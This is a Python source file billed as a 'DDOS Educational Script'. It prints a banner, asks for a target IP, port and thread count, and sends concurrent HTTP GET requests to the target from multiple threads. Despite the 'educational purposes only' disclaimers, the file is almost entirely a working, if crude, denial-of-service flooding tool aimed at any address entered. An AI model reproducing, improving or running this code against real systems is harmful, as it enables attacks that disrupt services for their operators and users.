import socket
import threading
import os

def display_banner():
    banner = r"""
    

░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓███████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░ 
    """
    os.system('clear' if os.name == 'posix' else 'cls')  # Clear the terminal screen
    print(banner)

def main():
    display_banner()
    # Add your script's functionality here
    print("Welcome to the DDOS Educational Script")
    print("This script is for educational purposes only.")

if __name__ == "__main__":
    main()

# Set a list of IP addresses (optional, as this won't truly spoof IPs in this form)
ip_addresses = ['8.8.4.4', '1.1.1.1']

def ddos(target_ip, target_port, thread_id):
    """
    Simulates sending repeated requests to a target server.
    Only for educational purposes in a controlled environment.
    """
    try:
        # Create a socket connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)  # Set a timeout for the connection
        sock.connect((target_ip, target_port))
        
        # Prepare and send HTTP GET request
        request = f"GET / HTTP/1.0\r\nHost: {target_ip}\r\n\r\n"
        sock.send(request.encode())
        print(f"[Thread {thread_id}] Request sent to {target_ip}:{target_port}")
        
        sock.close()
    except socket.error as e:
        print(f"[Thread {thread_id}] Error: {e}")

def run_ddos(target, port, num_threads):
    """
    Launch multiple threads to simulate concurrent requests.
    """
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=ddos, args=(target, port, i+1))
        threads.append(thread)
        thread.start()
    
    # Wait for all threads to finish
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    target = input("Enter the IP address of the target (e.g., 192.168.1.1): ")
    try:
        port = int(input("Enter the port number of the target (e.g., 80): "))
        if not (1 <= port <= 65535):
            raise ValueError("Port number must be between 1 and 65535.")
    except ValueError as e:
        print(f"Invalid port: {e}")
        exit(1)
    
    num_threads = input("Enter the number of threads: ")

    # Validate user input
    try:
        num_threads = int(num_threads)
        if num_threads < 1:
            raise ValueError("Number of threads must be at least 1.")
    except ValueError as e:
        print(f"Invalid input: {e}")
        exit(1)

    print(f"Starting DDoS simulation with {num_threads} threads on {target}:{port}...")
    run_ddos(target, port, num_threads)
